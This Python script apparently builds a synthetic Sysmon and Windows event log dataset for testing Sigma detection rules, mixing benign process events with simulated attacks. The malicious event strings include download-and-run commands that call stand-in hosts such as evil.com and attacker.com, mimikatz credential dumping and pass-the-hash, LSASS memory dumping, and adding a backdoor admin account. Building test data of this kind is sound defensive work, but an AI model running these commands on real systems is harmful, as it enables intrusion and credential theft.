#!/usr/bin/env python3
"""
Generate synthetic Sysmon + Windows Event JSON log dataset.

Produces a mix of benign and malicious events that will trigger
the seeded Sigma detection rules.

Usage:
    python generate_sample.py              # outputs sysmon_sample.json
    python generate_sample.py --count 500 # generate 500 events
"""
import json
import random
import argparse
from datetime import datetime, timedelta

# ─────────────────────────────────────────────────────────────────────────────
# Helpers
# ─────────────────────────────────────────────────────────────────────────────
HOSTS = [f"WORKSTATION-{i:02d}" for i in range(1, 9)] + ["DC-01", "SERVER-02"]
USERS = ["alice", "bob", "charlie", "dave", "svc_backup", "administrator", "SYSTEM"]
BASE_TIME = datetime(2024, 3, 1, 8, 0, 0)


def ts(offset_minutes: int = 0) -> str:
    t = BASE_TIME + timedelta(minutes=offset_minutes)
    return t.strftime("%Y-%m-%dT%H:%M:%SZ")


def rand_ts() -> str:
    return ts(random.randint(0, 60 * 24 * 30))  # Within 30 days


def rand_host() -> str:
    return random.choice(HOSTS)


def rand_user() -> str:
    return random.choice(USERS)


def make_process_create(
    image: str,
    command_line: str,
    parent_image: str = r"C:\Windows\explorer.exe",
    user: str | None = None,
    host: str | None = None,
    offset: int = 0,
) -> dict:
    return {
        "EventID": 1,
        "Computer": host or rand_host(),
        "UserName": user or rand_user(),
        "UtcTime": ts(offset),
        "EventData": {
            "Image": image,
            "CommandLine": command_line,
            "ParentImage": parent_image,
            "ParentCommandLine": "explorer.exe",
            "User": f"CORP\\{user or rand_user()}",
            "ProcessId": str(random.randint(1000, 9999)),
            "IntegrityLevel": "High",
            "Hashes": f"SHA256={random.randbytes(32).hex()}",
        },
    }


def make_network_conn(
    host: str | None = None,
    dest_ip: str = "192.168.1.100",
    dest_port: int = 443,
    image: str = r"C:\Windows\System32\svchost.exe",
    offset: int = 0,
) -> dict:
    return {
        "EventID": 3,
        "Computer": host or rand_host(),
        "UtcTime": ts(offset),
        "EventData": {
            "Image": image,
            "DestinationIp": dest_ip,
            "DestinationPort": dest_port,
            "Protocol": "tcp",
            "Initiated": "true",
            "SourceIp": "10.0.0." + str(random.randint(2, 254)),
            "SourcePort": str(random.randint(49152, 65535)),
        },
    }


def make_windows_event(
    event_id: int,
    host: str | None = None,
    subject_user: str | None = None,
    extra: dict | None = None,
    offset: int = 0,
) -> dict:
    return {
        "EventID": event_id,
        "Computer": host or rand_host(),
        "UserName": subject_user or rand_user(),
        "UtcTime": ts(offset),
        "EventData": {
            "SubjectUserName": subject_user or rand_user(),
            "SubjectDomainName": "CORP",
            **(extra or {}),
        },
    }


# ─────────────────────────────────────────────────────────────────────────────
# Malicious Events (trigger rules)
# ─────────────────────────────────────────────────────────────────────────────

def malicious_events() -> list:
    events = []
    i = 0

    # Rule 1: Suspicious PowerShell (5 hits)
    for _ in range(5):
        events.append(make_process_create(
            image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            command_line="powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -noprofile -c IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')",
            offset=i,
        ))
        i += 3

    # Rule 2: Encoded PowerShell (3 hits)
    for _ in range(3):
        events.append(make_process_create(
            image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            command_line="powershell.exe -enc ZQBjAGgAbwAgAEgAZQBsAGwAbwAgAFcAbwByAGwAZAA=",
            offset=i,
        ))
        i += 5

    # Rule 3: Office spawning command shell (2 hits)
    for _ in range(2):
        events.append(make_process_create(
            image=r"C:\Windows\System32\cmd.exe",
            command_line=r"cmd.exe /c powershell.exe -nop -w hidden -c malware",
            parent_image=r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
            offset=i,
        ))
        i += 7

    # Rule 4: Mimikatz (2 hits)
    for _ in range(2):
        events.append(make_process_create(
            image=r"C:\tools\mimikatz.exe",
            command_line="mimikatz.exe sekurlsa::logonpasswords privilege::debug exit",
            offset=i,
        ))
        i += 4

    # Rule 5: Net user command (4 hits)
    for _ in range(4):
        events.append(make_process_create(
            image=r"C:\Windows\System32\net.exe",
            command_line="net user hacker P@ssw0rd! /add",
            offset=i,
        ))
        i += 8

    # Rule 6: Scheduled task creation (3 hits)
    for _ in range(3):
        events.append(make_process_create(
            image=r"C:\Windows\System32\schtasks.exe",
            command_line=r"schtasks.exe /create /tn Updater /tr C:\malware\backdoor.exe /sc onlogon",
            offset=i,
        ))
        i += 10

    # Rule 7: PsExec (2 hits)
    for _ in range(2):
        events.append(make_process_create(
            image=r"C:\tools\PsExec64.exe",
            command_line=r"psexec64.exe \\DC-01 -s cmd.exe",
            offset=i,
        ))
        i += 6

    # Rule 8: Pass-the-Hash (1 hit)
    events.append({
        "EventID": 1,
        "Computer": rand_host(),
        "UserName": rand_user(),
        "UtcTime": ts(i),
        "EventData": {
            "Image": r"C:\tools\mimikatz.exe",
            "CommandLine": "mimikatz sekurlsa::pth /user:administrator /ntlm:aad3b435b51404eeaad3b435b51404ee /run:cmd.exe",
            "ParentImage": r"C:\Windows\System32\cmd.exe",
        },
    })
    i += 15

    # Rule 9: LSASS dump (2 hits)
    for _ in range(2):
        events.append(make_process_create(
            image=r"C:\sysinternals\procdump.exe",
            command_line="procdump.exe -ma lsass.exe lsass.dmp",
            offset=i,
        ))
        i += 7

    # Rule 10: Reg query (3 hits)
    for _ in range(3):
        events.append(make_process_create(
            image=r"C:\Windows\System32\reg.exe",
            command_line="reg query HKLM\\SAM",
            offset=i,
        ))
        i += 5

    # Rule 11: WMI subscription (2 hits)
    for _ in range(2):
        events.append(make_process_create(
            image=r"C:\Windows\System32\wbem\WMIC.exe",
            command_line="wmic /namespace:\\\\root\\subscription PATH __EventFilter CREATE Name=Persistence,EventNamespace=root\\cimv2,QueryLanguage=WQL,Query=SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'",
            offset=i,
        ))
        i += 9

    # Rule 12: Certutil download (3 hits)
    for _ in range(3):
        events.append(make_process_create(
            image=r"C:\Windows\System32\certutil.exe",
            command_line="certutil.exe -urlcache -split -f http://attacker.com/malware.exe malware.exe",
            offset=i,
        ))
        i += 6

    # Rule 13: Mshta (2 hits)
    for _ in range(2):
        events.append(make_process_create(
            image=r"C:\Windows\System32\mshta.exe",
            command_line="mshta.exe javascript:a=GetObject('script:http://malicious.com/vbs.sct').Exec();close()",
            offset=i,
        ))
        i += 8

    # Rule 14: Regsvr32 (2 hits)
    for _ in range(2):
        events.append(make_process_create(
            image=r"C:\Windows\System32\regsvr32.exe",
            command_line="regsvr32.exe /u /s /i:http://attacker.com/payload.sct scrobj.dll",
            offset=i,
        ))
        i += 7

    # Rule 15: BITS job (2 hits)
    for _ in range(2):
        events.append(make_process_create(
            image=r"C:\Windows\System32\bitsadmin.exe",
            command_line="bitsadmin.exe /transfer backdoor /download /priority foreground http://evil.com/payload.exe C:\\Users\\Public\\payload.exe",
            offset=i,
        ))
        i += 10

    # Rule 19: New local admin (2 hits)
    for _ in range(2):
        events.append(make_process_create(
            image=r"C:\Windows\System32\net.exe",
            command_line="net localgroup Administrators hacker /add",
            offset=i,
        ))
        i += 5

    # Rule 20: Audit log cleared (EventID 1102 × 2)
    for _ in range(2):
        events.append(make_windows_event(
            event_id=1102,
            offset=i,
            extra={"SubjectUserName": "administrator", "Channel": "Security"},
        ))
        i += 20

    return events


# ─────────────────────────────────────────────────────────────────────────────
# Benign Events
# ─────────────────────────────────────────────────────────────────────────────

def benign_events(count: int = 350) -> list:
    events = []
    benign_processes = [
        (r"C:\Windows\System32\notepad.exe", "notepad.exe report.txt"),
        (r"C:\Windows\System32\svchost.exe", r"svchost.exe -k netsvcs -p -s Schedule"),
        (r"C:\Program Files\Chrome\chrome.exe", "chrome.exe --type=renderer"),
        (r"C:\Windows\System32\explorer.exe", "explorer.exe"),
        (r"C:\Windows\System32\taskhostw.exe", "taskhostw.exe SYSTEM"),
        (r"C:\Windows\System32\conhost.exe", r"conhost.exe 0xffffffff -ForceV1"),
        (r"C:\Windows\System32\wuauclt.exe", "wuauclt.exe /UpdateDeploymentProvider"),
        (r"C:\Program Files\Windows Defender\MsMpEng.exe", "MsMpEng.exe"),
    ]
    for i in range(count):
        img, cmd = random.choice(benign_processes)
        events.append(make_process_create(
            image=img,
            command_line=cmd,
            offset=random.randint(0, 1440 * 30),
        ))
        if random.random() < 0.2:
            events.append(make_network_conn(
                dest_ip=f"10.0.0.{random.randint(1,254)}",
                dest_port=random.choice([80, 443, 445, 3389]),
                image=img,
                offset=random.randint(0, 1440 * 30),
            ))
        if random.random() < 0.05:
            events.append(make_windows_event(
                event_id=4624,
                offset=random.randint(0, 1440 * 30),
            ))
    return events


# ─────────────────────────────────────────────────────────────────────────────
# Main
# ─────────────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--count", type=int, default=500, help="Target total event count")
    parser.add_argument("--output", default="sysmon_sample.json", help="Output file path")
    args = parser.parse_args()

    evil = malicious_events()
    benign = benign_events(max(0, args.count - len(evil)))
    all_events = evil + benign
    random.shuffle(all_events)

    with open(args.output, "w", encoding="utf-8") as f:
        json.dump(all_events, f, indent=2)

    print(f"Generated {len(all_events)} events ({len(evil)} malicious, {len(benign)} benign)")
    print(f"Saved to: {args.output}")


if __name__ == "__main__":
    main()
